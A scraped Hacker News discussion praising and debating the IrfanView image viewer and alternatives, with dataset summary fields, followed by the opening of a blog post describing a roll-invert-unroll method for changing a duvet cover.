\"D\" and \"F\" to move by a single frame forward and backward there's also shortcut to decrease and increase things like saturation and brightness by 1% or shortcuts for 0.5x, 1x, 2x size. I have to make do with SMplayer in Linux which is awesome but you have to setup the keyboard shortcuts manually yourself. reply Pigalowda 16 hours agoparentprevAnd greenshot for snipping! reply haunter 13 hours agorootparentShareX reply furyofantares 13 hours agoparentprevvoidtools/everything for filesystem reply creatonez 13 hours agoprevI've found nomacs to be a good alternative: https://nomacs.org/ It hits the sweet spot when it comes to clipboard functionality -- You can either copy the image itself, or copy its path on the filesystem. Most image viewers only support one of these commands. reply techknight 16 hours agoprevIn Windows it's still faster than anything else if you've copied an image to clipboard to open irfanview -> paste -> save, or to do a quick crop or whatever. reply Leftium 3 hours agoparentDirectory Opus is a little faster: CTRL-P pastes anything (image, text; not sure what else) in clipboard to a file in current directory reply verstandhandel 16 hours agoparentprevor just the batch mode ... very helpful and fast. reply t0bia_s 4 hours agoparentprevWin + Shift + S reply respondo2134 16 hours agoparentprevfor those increasingly rare times you want to print an image it's great too. reply flas9sd 14 hours agoprevlove that the author still uses the same dithered photos of Jajce, Bosnia - his hometown - as in Win9x days in the about page and website: https://www.irfanview.com/main_about.htm .. make me want to visit. Edit: typo (thanks) reply shrx 14 hours agoparentJajce, not Jacje. https://en.wikipedia.org/wiki/Jajce reply ComputerGuru 2 hours agoprevGreat software but it isn’t color correct and has issues with embedded color profiles and conversion between color spaces. reply lencastre 15 hours agoprevWhen I have a hundred million images scattered on my computer and I need to quickly see them, nothing like a good script to herd them in a plain txt file and piping it to irfanview! No fidgeting with sixels, bat, or any other gui application. Hands down the fastest way… IMHO. reply jeffreygoesto 14 hours agoparentfeh is very fast as well. But it is only a viewer and does not edit. But under Linux it is my go-to viewer, also for cases like the one you describe. reply esafak 16 hours agoprevWindows was good for shareware developers because people had to buy utilities to like Irfanview to basically replace all the junk the OS shipped with. I eventually drop-kicked the whole OS and now life is good. reply Ringz 2 hours agoparentIt's exactly the same for me. I've been using MacOS for 15 years, and just pressing the spacebar to see an image is a huge relief. I never had to install a simple image viewer on macOS. And if I did, xnView would also work, which I had installed on Windows before. reply 9witz 11 hours agoprevHave used it since forever. Just used it today an hour ago. Usually to paste a windows screenshot and then do minor editing or cropping. Now windows has gotten a lot better, with the [WIN][Shift][s] shortcut (so cropping no longer is necessary). But that still misses a feature to quickly draw an arrow. Irfanview has that. Screenshot, crop, F12, put an arrow to point at something, copy, paste into Teams. So fast... reply lazyeye 9 hours agoparentFastone Capture is my goto for this. Does everything including drawing etc. Excellent software. reply smusamashah 9 hours agoprevThere is also JPEG View which is really fast and simple image viewer for windows https://github.com/sylikc/jpegview (fork of unmaintained https://sourceforge.net/projects/jpegview/) and another one vjpeg http://stereopsis.com/vjpeg/ These are both small and fast image viewers, specially noticeable on very large images. We need a list/directory of fast tools like these, specially now when every tool is bloated by default. reply omgmajk 11 hours agoprevI still use IrfanView to this day, all the way back since mid 90'ies. It's a fantastic piece of software with a great legacy and I wouldn't trade it for any modern photo software. So snappy and functional, works like a charm. With the plugins added to it you can open literally any image. reply refracture 15 hours agoprevStill use it. It’s faster to open and move through photos than the windows built in one. reply noufalibrahim 16 hours agoprevOne of those things you had to install on a new windows system. reply theoa 16 hours agoparentStill do reply myfonj 10 hours agoprevAlso my daily driver for any bitmap-related operations. One little thing that became my muscle memory over the years is using it to view/edit/crop latest clipboard entry, most often screenshots, through simple hotkey (olden AutoHotkey) launcher with `/clippaste` command line parameter. ; open / view current clipboard in irfanView ; win alt i #!i::run,path\\to\\IrfanView\\i_view32.exe /clippaste (Funny, totally forgot I still use 32 bit version.) There are lots of command line options available i_view32 provides. reply andsoitis 15 hours agoprevWikipedia page: https://en.wikipedia.org/wiki/IrfanView Does anyone know what programming language it is made with? I did a cursory search but cannot find any information. Just curious. reply copperx 15 hours agoparentI don't know for sure, but C++ is always a good guess with that kind of software. reply rav 14 hours agorootparentI downloaded IrfanView and ran \"strings\" on the exe file, and one of the strings in there is \"Microsoft Visual C++ Runtime Library\" - so that would point towards C++ (although it's not certain from that alone). reply ninkendo 12 hours agorootparentYeah, Irfanview dates to a time when MS’s C compiler was horribly out of date (still stuck in C89 compatibility), and the only way to get remotely modern language features was to compile it as C++, even if you never used any C++ features. Everyone was programming in “C++” on windows back then even if they were basically writing C. So yeah, it’s C++ but that doesn’t necessarily tell you much, it could still very well be basically C. reply 2-3-7-43-1807 14 hours agoprevthis ... and its text file counterpart ... Notepad++ ... glorious Windows 95. sounds strange but one reason why I'm now on Linux (Mint Cinnamon) is because I liked Windows 95 and XP so much. it's practically the same UI. no tile nonsense. a task bar. a start menu. a good ole desktop. beautiful. (and I also want to mention I did at least once donate to IrfanView / https://www.irfanview.com/main_support_engl.htm) reply maxlin 6 hours agoprevI've used irfanview for more than 15 years now. Mostly for looking at pictures. It's plenty fast. Doesn't work super well with multimonitor and should just ignore non-image files though imho reply playingalong 16 hours agoprevThat's my first memory of a program with keyboard shortcuts not being the typical ones, but still usable and thought through. Enter/return to go full screen (or exit from full screen?). reply antegamisou 16 hours agoprevAlong with ImageJ, that is open-source and has found use by researchers among many different disciplines, they're great examples of longstanding projects done right. reply buescher 13 hours agoparentImageJ has roots (NIH Image) that predate Photoshop. reply purplepatrick 8 hours agoprevMy dad introduced me to it after he started using it when it came out in 1996. It’s great, quick image editing. My only gripe with it is that cropping is unnecessarily convoluted… reply theandrewbailey 8 hours agoparent> My only gripe with it is that cropping is unnecessarily convoluted… What are you talking about? Make a rectangular selection on the image (click and drag across the image), then CTRL+Y. Couldn't be easier. reply justsomehnguy 15 hours agoprevDear Irfan! Thank you very much. From myself (1995-...) and my father (1995-2003). reply agumonkey 10 hours agoprevStill in https://ninite.com/ selection view reply mark-r 8 hours agoprevWas there a special reason this was posted today? Irfanview has been around forever. reply Ekaros 16 hours agoprevI wish I had corporate credit card... I could get myself copy for work... reply theandrewbailey 7 hours agoparentI paid for a license because Irfanview is an excellent program I use every day. I also happen to use it at work, too. reply n3storm 11 hours agoprevI think I used it from 1997 till 2001, all years I owned a windows pc. And until 2005 at windows pc at work. reply pentagrama 15 hours agoprevAround 2000-2007 I used something similar to this one (Windows XP/7 times), I can't recall the name right now. Someone remember other popular image viewers at the time? reply hexagonwin 15 hours agoparentMaybe ACDSee? reply dean2432 2 hours agorootparentI found ACDSee to be better than IrfanView. reply pentagrama 11 hours agorootparentprevThat one! Thank you. Nostalgia hit hard. reply genewitch 15 hours agoparentprevgraphic converter for mac OS. I'm still looking for a windows or linux image program that lets you do a slideshow and push a button to move/copy the current image to preset folders - for sorting images. reply ddon 15 hours agoparentprevProbably it was compupic or acdsee reply viksit 7 hours agoprevi’ve been using irfanview since i was in grade 4? and it’s one of the first things i install on every laptop i’ve owned ever since. reply dezsiszabi 6 hours agoprevGreat program, I use it to this day. reply UberFly 9 hours agoprevYes, we've heard of it. It's been around for 25+ years. reply bxparks 15 hours agoprevFor quick cropping, rescaling, and batch processing, this is the BEST image editor on Linux (using Wine of course). reply buescher 13 hours agoprevNo one else misses Picasa? reply Modified3019 8 hours agoparentI recall it being horrifically slow, and uninstalled shortly after. reply chrnola 11 hours agoparentprevSometimes, but the differences in performance between the two were quite vast if I recall correctly. reply buescher 8 hours agorootparentI recall the same but the Picasa user experience has not been surpassed. reply scotty79 15 hours agoprevFastStone gang forever reply cromka 10 hours agoprevIrfanView configured to open with space bar in WindowsCommander (as TotalCommander was called at the time) for a quick view. Name a more iconic duo. reply loughnane 15 hours agoprev6MB feels so refreshing. reply Dwedit 15 hours agoprevI wish this program was either open source, or had a plugin API. reply Ekaros 14 hours agoparentI think it must have some plugin API as it has plenty of plugins, but it seems for details you need to contact developer. reply joshxyz 11 hours agoprevthis is the sumatra pdf of images reply pdntspa 15 hours agoprevStill the best! reply mikl 11 hours agoprevIrfanView. Now, that’s a name I’ve not heard in a long time. Haven’t used that the last couple of decades. Interesting to see that it’s still around. reply devwastaken 12 hours agoprevIrfanview is so fast that I don't need to convert image sequences to video format. I can just press and hold right arrow key. I do wish there was a way to limit the speed though. reply gedy 15 hours agoprevWas a nice tool, but boy I hated seeing it's weird icon on every image files (before images had icon previews) reply colineartheta 14 hours agoprevMaybe I’ll get some hate for this, but years ago when I worked at a civil engineering firm this was the default image viewer IT had mapped every image file to open with - it was a nightmare! Every coworker I had (myself included) would constantly complain about the number of times they had to change to [literally anything else]. There were three distinct things I remember we all hated: 1. The image never opened full size, the window was always small and you had to manually drag the window frame to make it viewable. 2. It didn’t “zoom in” when you used your mouse wheel correctly, it would instead cycle through all of the images open in the folder you were working in. 3. When you clicked the arrows at the top to flip through a group of photos in the folder you were in (I recall the keyboard arrow keys not working for this, too), once you reached the end it would go to a black “fake” image, that you then couldn’t arrow back. It didn’t just cycle through the images, you had to close the window and reopen the image you were on. Needless to say, I have zero fond memories of this program. Maybe these were nuances of our particular setup (many other such cases at that firm, sadly), but…eh, whatever. There’s better out there. reply crtified 11 hours agoparentDysfunction in the IT of civil engineering (and similar) professions is fairly common. I remember this exact phenomenon too - of Irfanview's default UI controls not suiting what the staff were used to. And the staff didn't need The Most Powerful Tool Under The Sun, they just wanted to view and zoom and browse, and a few other tools, using the keypresses and mouse movements they were used to from previous software. And Irfanview could do those things in it's sleep with both hands tied, with a few simple config changes. But the dysfunction - often rooted in the minimal, grudging acknowledgement given to IT by (non-IT) old professions - led to a lot of half-assed setups where staff butted their heads against obstacles that were often a mere few clicks away from improvement, if only they'd known to put their attention there. But of course, they were too busy being civil engineers. And if I may shoehorn another point in here : it's not as though AutoCAD and other such industry software comes with ready default settings. If you used those straight out of the box with no customisation for your own situation, you'd be in deep trouble. reply airstrike 14 hours agoparentprevThose are all settings you could have changed yourself. IrfanView is the best image viewer on Windows, hands down. reply colineartheta 14 hours agorootparentExpressing a viewpoint necessitates a downvote? reply airstrike 10 hours agorootparentNothing wrong with expressing an opinion, and I'm not here to defend you against downvoters, but from my perspective it's an uninformed opinion. All of the \"issues\" you identified are really just preferences and the dev was kind enough to let you configure the app as you'd like. It would be impossible for the dev to create a set of custom settings that every user finds perfect, so your other comment about \"hostile defaults\" comes across as entitled The app is incredibly good. It does everything you could want, it's less than 10MB, blazing fast and easy to use. Super configurable. I used to have to fight with IT to have it installed or find a way to run some portable version just to have it at work. I can't speak for others, but I think if you had spent a little bit more time trying to figure out the solution to the issues you identify, you would have found the answer, but somehow you are instead blaming the dev, which is what IMHO warrants downvotes. reply baq 12 hours agorootparentprevSee also complaining about downvotes. reply awiesenhofer 14 hours agoparentprevAnd not once in all this time did you open settings and change these behaviours (which you can)? Weird. reply colineartheta 14 hours agorootparentNot once in all that time did I consider using a program with hostile default settings. Weird how hard this might be for an image viewer. reply shlubbert 12 hours agoparentprevI'm with you. To me IrfanView always felt incredibly archaic and chaotic, and I never wanted to wade through its 5 billion settings to \"fix\" it for me. But I guess some people just care more about UX while others just want as many features as possible, and I'm glad it's there for the latter camp. reply FpUser 10 hours agoprevI very much prefer FastStone image viewer reply pknerd 9 hours agoprevI guess anyone who has used windows would have come across irfanview one way or another reply pestatije 18 hours agoprevi use it to see .sid images...never found any other way to open those reply cess11 12 hours agoparentIs QGIS too bulky? reply instagraham 16 hours agoprevWhy are most comments referring to having used this in the past tense? I was under the impression that it was still the best image viewer in town, on Windows at least reply Rinzler89 16 hours agoparentBecause of a few things: 1. Windows 11 now ships with quite a decent and powerful image viewer/editor that covers most average users' use cases, therefore lowering the demand from people to go out of their way to find alternatives, like in the Windows XP days, which is a good thing (less likely to go download malware from the first Google result of \"image viewer for Windows XP\"). 2. PC usage behavior has changed a lot since then. Many people don't even have PCs at home anymore, and people now have most of their pics in the cloud or on their phone or some external NAS that comes with it's own browser viewer app, instead of hoarding them all on their home PC hard drive, further lowering the need to seek out dedicated image viewers to manage giant offline collections of digital camera pics(I mean I still do, but I'm a minority nowadays). These two factors combined meant the death of the third party PC image viewer app. Yeah, Irfan might be \"the best\", but the need for the best in this sector has declined significantly, and most users are now fine with \"good enough\". reply hilbert42 15 hours agorootparent\"...and people now have most of their pics in the cloud or on their phone,\" ...until Google closes their account or their data becomes otherwise inaccessible! It horrifies me that so many people are so willing to commit their valuable data to the cloud just because of convenience. Leaving aside Big Tech's spying on users and selling away their privacy, users who commit data to the cloud put its integrity and ultimately its long-term survival in the hands of third parties who couldn't give a damn whether it was lost or destroyed—their only interest is the income it generates. That the shift to the cloud has been so complete is very disconcerting. It never ceases to amaze me that so many are so trusting of others that they'd actually hand over their valuable data for safekeeping to the likes of Google, et al. I've used the internet since before the inception of the Web and I've never once committed any of my data to the cloud (but if I had to then it'd be an encrypted backup). Re IrfanView, I used to use Ed Hamrick's rather excellent image viewer VuePrint until I came across IrfanView about two decades ago. For numerous reasons IrfanView is the best viewer out there. reply jenscow 14 hours agorootparentBecause the chances of Google closing accounts or losing data is much lower than a consumer's usb drive being damaged or lost. reply overtomanu 14 hours agorootparentPlus, it is convenient to sync photos directly from mobile to the cloud without the need to set up syncing software or do periodic transfer/backup from mobile to PC. reply Nuzzerino 14 hours agorootparentprev…that wasn’t the point? Keeping possessions safe is the responsibility of the possessor. If you keep them all in one place with no backups, you can lose them more easily. And by the way, you don’t actually know the probability of a random person losing access to a Google account vs losing physical mediums, let alone how many of those cases were cases where their only photos were stored there. It’s obviously different from person to person, and maybe you can estimate that one is safer than the other in individual cases, but you can’t extrapolate that and say it applies in every person’s case. But the GP was referring to cases where it was implied the only copy was stored on the cloud. reply dpacmittal 13 hours agorootparentprev> It horrifies me that so many people are so willing to commit their valuable data to the cloud just because of convenience. I used to get horrified too until I learned that average user doesn't care much about losing pictures. My wife has lost phone full of pics multiple times and she's upset for like few hours. reply BLKNSLVR 11 hours agorootparentYou don't know what you've lost until it's something you want to re-live or remember. I go back through photos and videos of my kids and it reminds me that I succeeded at something worthwhile and difficult for at least a period of my life. They had a blessed childhood. Food or selfies and even holiday snaps mean little. But the kids... that's the raison d'être. Overall it's these photos and videos that are my strongest motivation for the paranoia-level backup setup I have. reply JeremyNT 13 hours agorootparentprevThis is an important insight. It's easy to obsess over the idea of any data loss, because the value of some data is quite high. But for most people in most circumstances losing their cloud hosted photos is probably not a big deal, and it's also probably far less likely than the users losing locally stored photos due to some mistake of their own. reply nuancebydefault 11 hours agorootparentprevWait a minute, if you don't have copies of data in the cloud, you have copies on HDDs and CDRWs? From experience I know that those fail within 10 years or so. Lot's of my data is already 20+ years in the cloud. reply formerly_proven 15 hours agorootparentprevDoes the Windows 11 photo viewer still have that gross flickering when changing images and absurdly slow startup that the Windows 10 photo viewer added when they replaced the old Vista/7 viewer, which had none of these issues? reply Rinzler89 15 hours agorootparentWhat flickering do you have? I don't see any. As for startup time, I dunno, seems to open in less than half a second for me, though on a relatively high end laptop. On a 10 year old machine it might suffer. reply nutrie 15 hours agorootparentI rarely use Windows these days, but IrfanView feels lightning fast compared to the built-in Photos app or whatever they call it. I started using IV I think on Win 98 and it's still as snappy and reliable as it always has been. reply hilbert42 14 hours agorootparentI haven't used the latest Windows viewer because I'm no longer prepared to upgrade to the latest versions of Windows, but the old version was a dog of a program compared to IrfanView, it was slow, couldn't display many formats and would misbehave if the image files were damaged. And yes, at times it flickers and or images can tear. reply Rinzler89 12 hours agorootparentThe recent photo viewer is great. I never felt the need to install Irfan anymore just to view photos since .. a long time now. I mean why would I? If all I need is viewing a couple of photos every now and then, cropping and rotating one or two and drawing some circles on them to highlight something in a screenshot and Windows already does that then why bother with Irfan other than habit and nostalgia. reply typon 15 hours agorootparentprevThe \"enshittification\" of computing. The Windows 11 default Photo Viewer has probably 20% of the features of IrfanView - and the problem is that normal users don't know a better tool exists for free if they need those extra features. As the resident techie in my house I get asked by people to do simple things like overlay text in a certain style or print a photo with a particular resolution or print multiple photos etc. and these tasks are just harder or impossible with the default tools reply broast 15 hours agorootparentI'm guessing even if they knew the tool existed they would still rather ask you to do it. Not everyone wants to understand computers or download programs reply copperx 15 hours agorootparentMore importantly, not everybody wants to be entirely self reliant. They're ok with small task delegation. reply cellularmitosis 14 hours agorootparentSometimes you don’t realize things about yourself until someone else puts it into words. Thank you, internet stranger reply allanrbo 16 hours agoparentprevIt made more sense to go through the effort to install IrfanView when there was no image previewer built into windows, in the days of Windows 95/98/ME/2000. Those only had MS Paint, and I think some versions only supported bmp files (no jpeg or gif). Windows XP had an ok image previewer. reply joshuaissac 16 hours agorootparent> no image previewer built into windows, in the days of Windows 95/98/ME/2000 Windows has shipped with an image previewer since Windows ME. You can see it in this screenshot: https://www.reddit.com/r/windows98/comments/y1lj7x/winme_ima... reply earslap 16 hours agorootparentIIRC the killer \"feature\" that gave these previewers traction (ACDSee, IrfanView etc.) was that you could just preview a bunch of images in a folder using your arrow keys. So you'd just load one and use arrow keys to see the other images in the same folder. With the built-in options, you'd have to double click images one by one (and close their windows one by one) which was a horrible UX compared to what these provided. reply lstamour 16 hours agorootparentprevThat’s the “Preview pane” in explorer. It only supports the file types you could preview in explorer, it only “opens” the file currently selected in Explorer, and didn’t let you zoom in or inspect the image in any way that I recall. It was a plain preview that was supported (in ME) by the integrations Explorer had with Internet Explorer, I believe. Often installing IrfanView let you preview more file types in Explorer, and you could open more than one, display them full screen, edit them, resize them, and more… reply nickjj 15 hours agoparentprevIMO it's up there, I've been using it for over 20+ years. IrfanView and foobar2000 (mp3 player) haven't left my side since I started using them. Ditto (clipboard manager) has also earned its place. reply baq 12 hours agorootparentOf the three, ditto easily takes no. 1 spot. Must’ve saved me weeks of juggling windows and trying to remember where stuff was at this point. It’s a superpower, a true game changer if I ever saw one. Maccy on macOS is about half as good which is still an absolute unit of a tool. Couldn’t use a Mac without it. reply nickjj 8 hours agorootparentYep, funny enough I have a Macbook for work (company laptop) and I also stumbled upon Maccy. You're right in that it's not Ditto but it's quite good and I'm overall happy using it. reply hilbert42 14 hours agorootparentprevRight, foobar2000 is great isn't it? reply monkpit 14 hours agorootparentprevTo add to that, for me mplayer was clutch for a long time, nowadays I opt for VLC though. reply integricho 14 hours agorootparentmv2player was a really good option for a period of time, it's a shame it just disappeared, not even it's source code can be found. reply whitten 12 hours agorootparentThat sounds bad. Is it on any old shareware sites ? reply shzhdbi09gv8ioi 15 hours agoparentprevI used to use irfranview for many years, but I rarely ever use Windows anymore. I recently started to use oculante [1] for image viewer because its cross os. Before that, I used imv on Linux and xee on macOS. 1: https://github.com/woelper/oculante reply dantondwa 12 hours agorootparentThis is amazing! Thank you for sharing it. reply codetrotter 16 hours agoparentprevFor me it’s because I haven’t run Windows for ages reply monocasa 16 hours agorootparentI've run it via wine for probably close to twenty years now. reply haunter 16 hours agoparentprevI use JPEGView nowadays https://github.com/sylikc/jpegview reply Semaphor 15 hours agorootparentDoes it have feature parity? Just from the list it looks like it only supports a small fraction of what Irfan view does. reply netol 12 hours agorootparentNo that many. It supports the most important ones though, and it is the fastest reply abulman 16 hours agoparentprevAgreed - I'm still using it everyday to view and do some minor editing (trimming and resizing pics). It, along with browsers, VLC, Putty, and SublimeText (and now also ObsidianMD) are the first things I will download to a new Windows PC. reply AltruisticGapHN 15 hours agoparentprevXnView is great. Although I had to tweak the CSS to have a clean UX removing all the excess edges and separators and add dark background. reply Saris 16 hours agoparentprevThe built in photos app is quite good now, although it can't open apple heif files yet. reply Rinzler89 15 hours agorootparentIt should with the Microsoft HEIF plugin: https://apps.microsoft.com/detail/9pmmsr1cgpwg?hl=en-us reply Saris 15 hours agorootparentThanks! Good to know. reply chris_wot 11 hours agorootparentprevDoesn’t work with “live” photos. reply ano-ther 15 hours agoparentprevIt is very much present tense at least to me. It’s among the first programs on all new Windows machines that I set up. Plus, there are Windows Store and portable versions which help to use it on otherwise locked-down company computers. reply loughnane 15 hours agorootparentI was like this too. I moved away from windows machines (to Linux) for good in 2019 though so now I don’t use it. If I had to go back it would def be one the first I installed. reply thih9 16 hours agoparentprevMost people look at images via browser these days. reply pdntspa 15 hours agorootparentWho cares what 'most people do'? Why are we constantly resorting to this tired refrain of \"majority rules\"? Have you all forgotten that niche things exist? reply scubbo 13 hours agorootparent> Why are most comments referring to having used this in the past tense? > Who cares what 'most people do'? Someone trying to understand why _most_ comments reflect a certain behaviour is, by definition, someone who cares about understanding what \"what most people do\". reply Rinzler89 15 hours agorootparentprev>Who cares what 'most people do'? Democracy and economics. >Why are we constantly resorting to this tired refrain of \"majority rules\"? It's not constantly, it's the answer to this question. Why are you getting your knickers in a twist? In this case he gave the answer to the question of why Irfan view isn't popular anymore and the answer is because the majority of people have moved on. It's not something he decided or that he can change, it's just the fact and he's reported it to you. The fact that you don't like the reality, is your own issue. reply thih9 13 hours agorootparentprevNiche things by definition are less popular. In my grandparent comment I was explaining why standalone image viewers are less popular. Looks like we agree. reply hilbert42 14 hours agorootparentprev\"...via browser these days.\" 'Most people' = LCD/lowest common denominator. If one doesn't mind grovelling around at the bottom then that's fine. reply broodbucket 14 hours agorootparentThis seems unnecessarily harsh. reply hilbert42 11 hours agorootparentIt may be, but by whose or what standard? We are now in an age where expected norms in society are such that the slightest criticism of anyone—even if justified—is taken as offensive by both the recipient and by onlookers. Unfortunately, keeping mum and not saying anything just lets people off the hook, they no longer have to justify their actions either to themselves or anyone else. In fact, I'd argue that in recent years the trend has gotten so bad and out of hand that it's having a very noticeable negative impact on society. Clearly, I'm older than you, when I was younger this comment would have hardly raised an eyebrow (right, I'm old enough to have noticed this societal change and the negative impact it's had). When I was at school we were actively taught to ignore unwarranted critism, and even if it were justified to consider carefully what was actually said before responding. In fact, the old adage that 'sticks and stones may break my bones but words will never hurt me' was drummed into us kids at a very early age (in infants school). Can you imagin teachers teaching that today? I'd reckon they'd likely be lynched. Now, what's the situation nowadays when kids are no longer taught how to develop and strengthen their resilience? Well, one only has to look at the fallout on social media. Now we have kids taking such great offense at something someone has said to them and they're getting upset to such an extent that some even resort to suicide. (When I was a kid suicide was something that only adults with disturbed minds did—never kids or teenagers, it was unheard of. No doubt there were isolated instances but we kids never heard of them.) reply fmajid 14 hours agoparentprevBecause many HN readers have moved on from Windows. reply AlienRobot 15 hours agoparentprevI prefer JPEGView on Windows. What do you think is the best alternative for Linux? reply dean2432 2 hours agorootparentI have not found a faster image viewer on Linux than 'feh'. And I've tried a lot. reply Semaphor 15 hours agorootparentprevJust saw this mentioned above, might as well ask here: why? It looks to only support a small fraction of features. reply netol 12 hours agorootparentIt's faster to load images reply AlienRobot 9 hours agorootparentprevIt opens instantly. It shows just the image by default (no toolbars, scroll bars, menu bars, or status bars). I can disable linear interpolation with F3 and show width/height of an image with F2. It zooms with the scroll wheel, pans by dragging, and it lets me go to the next, previous, first, and last image of a directory instantly, and doing that won't resize the window. I suppose the key difference is that some people want just a read-only image viewer that traverses a directory, while others want a photo viewer, or image metadata editor, or photo management system. I haven't used Windows' default image viewer in ages, but I recall when I used it, rotating an image actually rotated the image, as in it changed the orientation header of JPEG files and rewrote the files. This is why I have trust issues. If even image viewers can't just view the image, how can I possibly trust the software that drives cars, flies planes, or does the banking? reply Semaphor 1 hour agorootparent> I suppose the key difference is Not really the difference in context of IrfanView which is also just an image viewer. I tried JpegView, but it’s lacking several features I use in IV, and stuff I commonly do in IV is harder to do, so for me IV is a clear and easy winner. Performance is a little better, but not in a way I’d actually care about (mainly superfast skipping through images is slightly faster) reply gsich 16 hours agoparentprevIt's not. reply j45 16 hours agorootparentAlternative? reply yau8edq12i 16 hours agorootparentThe built-in viewer in windows is fine. I can't really think of a feature that it doesn't have that I need. Could you say why irfanview gets your vote? reply jacekm 15 hours agorootparentIt's about speed mostly. And I got used to the shortcuts, ctrl+r to resize, 'i' to check image metadata. I don't really use any of the editing features (I use Paint.NET for edits). In theory I don't need a dedicated image viewer but I like IrfanView so much that I even paid for it so I can have it on company's laptop. reply jjbinx007 16 hours agorootparentprevThe batch image manipulation features it offers are pretty handy. Plus you can press L or R to rotate an image and it has lossless rotate options as well. reply j45 14 hours agorootparentI'm pretty sure it had batch processing capabilities before Photoshop. reply card_zero 15 hours agorootparentprevIt's also a paint tool (edit->show paint dialog), and does tricks like swapping channels or repeating the image as a grid of tiles, which are handy when programming something involving raster graphics or textures. reply jajko 16 hours agorootparentprevThe speed, plugins ecosystem, many more formats supported out of the box, crop being faster and more intuitive, often good enough auto adjust. Irfan for images and vlc for video is the name of the game for me (and total commander for file management, the efficiency compared to simpler stuff is still in wow territory). reply copperx 14 hours agorootparentDidectoryOpus is even better, but it's expensive. reply j45 14 hours agorootparentprevIrfanView started so long ago, got and stayed so far ahead. Wish there was a mac version, but it can be run in an emulator easy enough. reply j45 14 hours agorootparentprevInstall it and you'll see within 5-10 minutes the next time you have go through a bunch of images, or do something to a bunch of images. IrfanView likely still supports more formats, since it was earlier than any other tool. This means any edge cases in file encoding that might not work, or render ideally likely has been solved there first. It probably has some batch file conversion tricks in it too. IrfanView also provided for free for a lot of years what was hard to get without paying. If it existed on mac I'd be all over it. Ah, the windows viewer always wasn't that good. And if I remember the big first improvement of it was copying a lot of IrfanView. Since this post, I remembered another old friend that was excellent on windows, AcdSEE. Also worth looking into. reply gsich 7 hours agorootparentprevFastPictureViewer reply redder23 15 hours agoprev [–] Ah, the nostalgia when Windows what so shitty that you actually needed a tool for the simplest of the simplest tasks of viewing images in all kinds of formats. I see no need for it for myself as even Windows has a default image viewer that is enough for me and I mainly use Linux anyway and every decent distro comes with a tool for that. Gnome and KDE both have their own that fit into the DE perfectly. reply skeeter2020 9 hours agoparentGood to hear your smug, self-satisfaction is keeping you warm, but anyone who thinks this is comparable to the default image viewer in Windows (even windows 30+ years after IrfanView) is out of sync. reply cynicalsecurity 14 hours agoparentprev [–] Windows is still shitty. Same way, I've been on Linux for more than a decade already. Windows at work still hugely sucks. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "IrfanView is a widely used graphic viewer software provided in 32 and 64-bit editions, known for its speed, compactness, and free availability for non-commercial purposes.",
      "Users can utilize numerous features such as image viewing, conversion, optimization, batch processing, and more, with support for multiple languages, Unicode, and various Windows OS.",
      "The program, created by Irfan Skiljan, offers plugins, skins, and a support forum, along with donation opportunities for those interested in contributing."
    ],
    "commentSummary": [
      "The discussion highlights IrfanView for its speed, simplicity, and versatility in handling photo editing tasks, along with other tools like Ditto, Everything, and SumatraPDF.",
      "Users appreciate IrfanView for its ease of use in image manipulation, batch processing, and viewing various file formats, emphasizing its popularity and efficiency compared to other software.",
      "The conversation covers preferences for different tools on various platforms, evolving image viewing software on different operating systems, importance of data backup, and comparing cloud storage with physical backups."
    ],
    "points": 408,
    "commentCount": 249,
    "retryCount": 0,
    "time": 1711807005
  },
  {
    "id": 39877730,
    "title": "Effortlessly Change Your Duvet Cover with Roll-Invert-Unroll",
    "originLink": "https://danverbraganza.com/writings/an-easier-way-to-replace-a-duvet-cover",
    "originBody": "We use cookies We use cookies and other tracking technologies to improve your browsing experience on our website, to show you personalized content and targeted ads, to analyze our website traffic, and to understand where our visitors are coming from. OKChange my preferences Extravaganza > Selected Writings Roll-Invert-Unroll: An Easier Way to Replace a Duvet Cover This way of putting a cover onto a duvet might save you effort and time! by Danver Braganza on 2024-03-30 Changing a duvet or comforter cover used to be quite hard for me, before I discovered a trick to make it much more simple. Imagine replacing your duvet cover in minutes, and without resorting to frantic shaking of your duvet. This duvet cover changing hack, which I call the “roll-invert-unroll” will make this a reality. Putting on a duvet cover can be challenging I recently learned that the American Cleaning Institute recommends that we wash our duvet covers monthly. Other expert voices say we should be doing this fortnightly, or even weekly. Without revealing too much, I’ll admit my current schedule falls a little outside of these recommendations. The hardest part of changing my bedclothes is usually attempting to get the duvet cover on after everything has been washed! Frankly, it is the part I dread the most. Between the floppy nature of the comforter inner and the friction between cover and inner, it felt like trying to force a noodle through a straw. Often I had to resort to crawling inside the duvet cover and standing up with the inner a tonne of shaking to get the two masses of fabric to line up satisfactorially. These problems are much harder when you’re alone, but even with a partner to help there’s a lot of wasted effort. In the next section, I’ll describe how to put on a duvet cover easily and more efficiently, especially when you’re doing it alone. Roll - Invert - Unroll While I don’t exactly remember how I discovered this method of putting on a duvet cover, I do recall waking up one day with this method in my head. Perhaps I had dreamed it? Excited to try it out, I immediately removed my duvet cover and put it back on again, without actually washing it—and I was excited when the method worked. It’s unlikely that I’m the first to invent it, but I’m stubbornly not going to check the Internet before publishing this article. At the very least, I’m helping spread the word to new people. The method follows very simple steps: Roll, Invert, Unroll. Prepare by arranging your duvet and cover Fig. 1 First take your washed and dried duvet cover and turn it inside out. Inverting the cover before you begin is a critical step, and it will make sense later. Fig. 2 Next, lay it out completely flat on the bed, with the opening towards the foot of the bed Fig. 3 Now lay your duvet inner on top of your cover Fig. 4 Secure all four corners of your duvet inner to the cover This step is not absolutely necessary, but makes the following steps easier and more tolerant if you’re a little less precise with the rolling and unrolling. Securing the corners will also prevent the inner from drifting inside the cover and forming lumps. My cover has ties for securing it to the inner. If you don’t have them, you can use safety pins. Roll the duvet inner and cover together Fig. 5 Tightly roll the inner and the cover together, keeping the cover on the outside. Start at the head of the bed, and roll towards the cover opening at the foot. Fig. 6 When you're done rolling, it should look like this. Note that I've rotated the entire roll for better lighting in this photo—you should keep your roll by the foot of your bed. Invert the duvet cover over the entire roll This is the part that feels like magic. Keeping the roll tight, you invert the duvet cover over the entire roll, starting from one end of the opening and working towards the other. Fig. 7 Start by finding the vertex of the opening on one side. Usually, the opening will be a few centimeters in from the very end of the roll. Feel free to stuff the end through this opening. Fig. 8 Work along the edge, continuing to join the openings of the cover on the opposite side of the roll. It helps to button the opening on the correct side, as you go. Fig. 9 In this picture, I'm just about to close the last button. When you're done, your roll should look like this. Unroll Fig. 10 Unroll your freshly made duvet! And that’s it—Your duvet rolls right into place, ready for your to sleep in it! To wrap it up I have been replacing my duvet in this way for more than five years now. Not only has it saved 